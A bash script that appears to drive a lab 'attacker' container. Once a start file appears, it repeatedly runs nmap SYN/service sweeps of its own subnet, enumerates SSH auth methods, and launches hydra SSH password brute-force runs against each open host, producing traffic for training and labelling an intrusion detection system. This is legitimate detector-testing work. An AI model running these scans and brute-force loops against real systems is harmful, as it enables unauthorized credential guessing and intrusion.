#!/bin/bash
# Static attacker entrypoint — deterministic, mechanical, high-cadence.
# Every ATTACK_INTERVAL seconds (default 60) it runs a fresh nmap -sS -A sweep
# of its subnet, an SSH discovery that also enumerates auth methods
# (ssh-auth-methods NSE), and a hydra SSH brute pass driven with curated
# user/pass lists. (The one-time -sn discovery sweep and the per-cycle -sT
# connect sweep were dropped — they did not shift the traffic fractions.)
#
# Why this cadence: SLIPS fires alerts per (profile, timewindow) — fresh
# nmap evidence arriving each minute keeps every TW's attack-labelling alive
# (the FL module's alert-based labels depend on recurring evidence). The old
# 5-minute sweep left large label-less gaps in a 5-minute SLIPS time window;
# with this interval every window has new evidence, always.
#
# Baseline gating: stays quiet until the experiment runner creates
# /tmp/start_static_attacker at attack-phase start (same instant Aracne
# launches). Standalone: docker exec <c> touch /tmp/start_static_attacker
#
# Targets: derived from the container's own interface (no hardcoded IPs);
# override with TARGET_SUBNET. Cadence tunables: ATTACK_INTERVAL.

set -u

INTERFACE=$(ip route | awk '/default/ {for (i=1;i<=NF;i++) if ($i=="dev"){print $(i+1); exit}}')
INTERFACE=${INTERFACE:-eth0}
SUBNET=${TARGET_SUBNET:-$(ip -o -4 addr show "$INTERFACE" 2>/dev/null | awk '{print $4}')}
SUBNET=${SUBNET:-10.0.0.0/8}
INTERVAL=${ATTACK_INTERVAL:-60}
# Sweep breadth cap (per cycle): 1000-port sweeps drowned every labeling
# window in attacker flows; 50 keeps evidence cadence at ~20x less volume.
# MUST be assigned before any use (script runs with set -u).
TOP_PORTS=${TOP_PORTS:-50}
NOW=$(date -u +%Y%m%d_%H%M%S)
LOG=/var/log/static_attacker/nmap_${NOW}.log
: > "$LOG"

# Canonicalize the password list once (nmap's passwords.lst carries comments)
PASSDB=/tmp/passwords.txt
grep -v -e '^#' -e '^$' /usr/share/nmap/nselib/data/passwords.lst > "$PASSDB" 2>/dev/null || \
  cp /usr/share/nmap/nselib/data/passwords.lst "$PASSDB"

echo "[static-attacker] interface=$INTERFACE subnet=$SUBNET interval=${INTERVAL}s log=$LOG" | tee -a "$LOG"

echo "[static-attacker] waiting for /tmp/start_static_attacker (attack phase start)..." | tee -a "$LOG"
while [ ! -f /tmp/start_static_attacker ]; do
  sleep 2
done
echo "[static-attacker] attack phase started — engaging" | tee -a "$LOG"

while true; do
  cycle=$(date -u +%F\ %T)
  echo "===== $cycle sweep $SUBNET (nmap -sS -sV --script=default, top ${TOP_PORTS} ports) =====" >> "$LOG"
  # SYN scan + service/script detection of the subnet: feeds SLIPS's
  # portscan/service alerts. We use -sV --script=default instead of -A so OS
  # detection (-O) is off - its UDP probe was the attacker's only UDP traffic.
  nmap -sS -sV --script=default -T4 \
    --top-ports "$TOP_PORTS" \
    --exclude 127.0.0.0/8,localhost \
    "$SUBNET" >> "$LOG" 2>&1 || true

  echo "===== $cycle ssh discovery + auth-methods $SUBNET (nmap --script ssh-auth-methods) =====" >> "$LOG"
  # SSH discovery that also enumerates each server's accepted auth methods
  # (ssh-auth-methods NSE; needs a full TCP connection, hence -sT). Normal
  # output (incl. the script result) goes to the log; the greppable copy to a
  # file feeds the hydra target list. nmap's ssh-brute NSE stays unused in this
  # image (libssh2 handshake error vs OpenSSH >=8.9), so hydra does the brute.
  nmap -sT -T4 -p 22 --open --script ssh-auth-methods \
    -oG /tmp/ssh_targets.gnmap \
    --exclude 127.0.0.0/8,localhost \
    "$SUBNET" >> "$LOG" 2>&1 || true
  awk '/22\/open/ {print $2}' /tmp/ssh_targets.gnmap > /tmp/ssh_targets.txt 2>/dev/null || : > /tmp/ssh_targets.txt
  if [ -s /tmp/ssh_targets.txt ]; then
    while read -r host; do
      [ -n "$host" ] || continue
      echo "-- hydra ssh://$host (users=/root/users.txt, passes=passwords.lst)" >> "$LOG"
      timeout 45 hydra -L /root/users.txt -P "$PASSDB" \
        -t 4 -f -V "ssh://$host" >> "$LOG" 2>&1 || true
    done < /tmp/ssh_targets.txt
  else
    echo "-- no ssh services found on $SUBNET" >> "$LOG"
  fi
  echo "===== cycle done $(date -u +%F\ %T) =====" >> "$LOG"
  sleep "$INTERVAL"
done
